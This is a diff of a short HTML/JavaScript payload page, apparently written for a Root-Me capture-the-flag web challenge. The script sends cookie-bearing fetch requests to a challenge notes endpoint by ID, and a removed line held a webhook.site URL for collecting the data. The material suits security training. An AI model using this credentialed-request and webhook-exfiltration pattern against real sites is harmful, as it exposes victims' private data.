@@ -2,19 +2,22 @@
 <html>
 <body>
 <script>
-const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
-const START_ID = 0;
-
-let current = START_ID;
-let active = false;
-let found = false;
 
 function tryId(i) {
     fetch(TARGET + i, {
         credentials: 'include'
-    }).then(console.log(res));
-tryId(1365);
+    })
+    .then(res => {
+        console.log(i, res);
+    })
+    .catch(err => {
+        console.log("error", i);
+    });
+}
+
+tryId(1377);
 </script>
+
 </body>
 </html>
